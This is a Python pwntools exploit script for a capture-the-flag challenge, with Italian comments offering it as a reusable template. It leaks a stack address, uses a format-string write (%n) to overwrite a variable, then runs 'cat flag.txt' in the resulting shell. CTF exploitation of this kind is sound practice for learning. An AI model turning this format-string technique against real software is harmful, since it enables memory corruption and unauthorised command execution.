#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("main_patched")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db sym.main; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)



'''
data = {}
# offset finder
for i in range(1, 20):
    io = start()
    buffer = io.recvline().decode().split(' ')[-1].strip()
    buffer = int(buffer, 16)
    io.sendline(b'aaaaaaaa'+f"%{i}$p".encode())
    data[i] = io.recvline().decode()
    io.close()
'''

io = start()
buffer = io.recvline().decode().split(' ')[-1].strip()
variable = int(buffer, 16) - 8
offset = 9
success(hex(variable))
fmtstr = f"%90c%{offset}$n".encode()
fmtstr += p64(variable)
io.sendline(fmtstr)


io.sendline(b"cat flag.txt")
flag = io.recvregex(rb'LITCTF\{.*\}', capture=True)
success(flag.group(0).decode())

io.close()